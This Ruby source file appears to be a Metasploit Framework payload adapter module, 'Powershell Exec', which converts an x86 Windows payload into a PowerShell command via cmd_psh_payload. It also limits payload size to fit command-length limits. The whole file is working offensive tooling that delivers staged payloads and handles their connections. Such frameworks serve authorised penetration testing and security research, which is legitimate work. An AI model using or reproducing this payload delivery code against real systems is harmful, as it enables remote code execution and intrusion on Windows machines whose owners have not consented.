##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  include Msf::Payload::Adapter
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Powershell Exec',
        'Description' => 'Execute an x86 payload from a command via PowerShell',
        'Author' => 'Spencer McIntyre',
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'License' => MSF_LICENSE,
        'AdaptedArch' => ARCH_X86,
        'AdaptedPlatform' => 'win',
        'RequiredCmd' => 'powershell'
      )
    )
  end

  def compatible?(mod)
    # size is not unlimited due to the standard command length limit, the final size depends on the options that are
    # configured but 3,000 is in a good range (can go up to 4,000 with default settings at this time)
    if mod.type == Msf::MODULE_PAYLOAD && (mod.class.const_defined?(:CachedSize) && mod.class::CachedSize != :dynamic) && (mod.class::CachedSize >= 3_000)
      return false
    end

    super
  end

  def generate(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    payload = super

    cmd_psh_payload(payload, ARCH_X86, remove_comspec: true)
  end

  def generate_stage(opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end

  def generate_payload_uuid(conf = {})
    conf[:arch] ||= module_info['AdaptedArch']
    conf[:platform] ||= module_info['AdaptedPlatform']
    super
  end

  def handle_connection(conn, opts = {})
    opts[:arch] ||= module_info['AdaptedArch']
    super
  end
end
